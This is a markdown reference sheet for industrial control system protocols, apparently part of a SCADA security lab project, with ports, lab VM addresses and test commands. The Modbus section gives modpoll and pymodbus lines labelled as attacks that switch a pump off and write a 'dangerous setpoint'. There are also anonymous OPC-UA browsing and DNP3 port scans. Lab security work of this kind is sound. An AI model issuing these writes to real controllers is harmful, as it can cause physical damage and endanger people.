# ICS Protocol Reference

**Maintained by**: SCADA_AGENT  
**Coverage**: Modbus TCP · DNP3 · EtherNet/IP · OPC-UA · IEC 61850

---

## Quick Reference

| Protocol | Default Port | Auth | Encryption | Primary Attack |
|---|---|---|---|---|
| Modbus TCP | 502 | None | None | Coil/register read-write |
| DNP3 | 20000 | None (Level 1) | None | Replay, spoofing |
| EtherNet/IP (CIP) | 44818 | None (default) | None | Tag read-write |
| OPC-UA | 4840 | Optional (often anonymous) | Optional (often disabled) | Anonymous endpoint |
| IEC 61850 / MMS | 102 | None | None | GOOSE injection |

---

## Lab Endpoints (populated during Phase 7)

| Protocol | VM | IP | Port | Notes |
|---|---|---|---|---|
| Modbus TCP | openplc-01 | 192.168.100.10 | 502 | Unit ID 1 |
| OPC-UA | ignition-dev | 192.168.100.20 | 4840 | Anonymous enabled |
| Modbus TCP | grfics-plc | 192.168.100.30 | 502 | GRFICSv2 reactor |
| DNP3 | dnp3-outstation | 192.168.100.40 | 20000 | Outstation addr 10 |

---

## Modbus TCP

**Function codes used in scenarios:**

| FC | Name | Use in lab |
|---|---|---|
| 01 | Read Coils | Enumerate digital outputs (pump, valve states) |
| 03 | Read Holding Registers | Read setpoints and analog values |
| 05 | Write Single Coil | **Attack**: disable/enable pump or valve |
| 06 | Write Single Register | **Attack**: change setpoint to unsafe value |
| 16 | Write Multiple Registers | Batch setpoint manipulation |

**Test commands:**
```bash
# Read 8 coils from address 0
modpoll -m tcp -p 502 -t 0 -c 8 192.168.100.10

# Read 10 holding registers from address 0
modpoll -m tcp -p 502 -t 4 -c 10 192.168.100.10

# Write coil 0 = OFF (disable pump)
modpoll -m tcp -p 502 -t 0 -c 1 192.168.100.10 0

# Write holding register 0 = 999 (dangerous setpoint)
modpoll -m tcp -p 502 -t 4:w -c 1 192.168.100.10 999
```

```python
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient("192.168.100.10", port=502)
c.connect()
c.read_coils(0, 8, slave=1)            # read 8 coils
c.write_coil(0, False, slave=1)        # disable pump
c.read_holding_registers(0, 4, slave=1) # read setpoints
c.write_register(0, 999, slave=1)      # write dangerous setpoint
c.close()
```

---

## OPC-UA

**Discovery and anonymous access:**
```bash
# Install: pip3 install opcua
python3 - <<'EOF'
from opcua import Client
c = Client("opc.tcp://192.168.100.20:4840/")
c.connect()
root = c.get_root_node()
for child in root.get_children():
    print(child.get_browse_name(), child.get_node_class())
c.disconnect()
EOF
```

**GUI tool:** UaExpert (free) — download from unified-automation.com

---

## DNP3

**Outstation test:**
```bash
# Using scapy dnp3 layer or OpenDNP3 test tools
# Scan for DNP3 outstation on port 20000
nmap -sU -p 20000 192.168.100.40
nmap -sT -p 20000 192.168.100.40
```

---

## Register Maps

Detailed register maps for each PLC are in `docs/scada/registers/`:
- `openplc_REGISTER_MAP.md` — tank_fill_control coil and register map
- Additional maps added as SCADA_AGENT builds each PLC program

*Run `/scada document register map for <plc_name>` to generate a register map.*
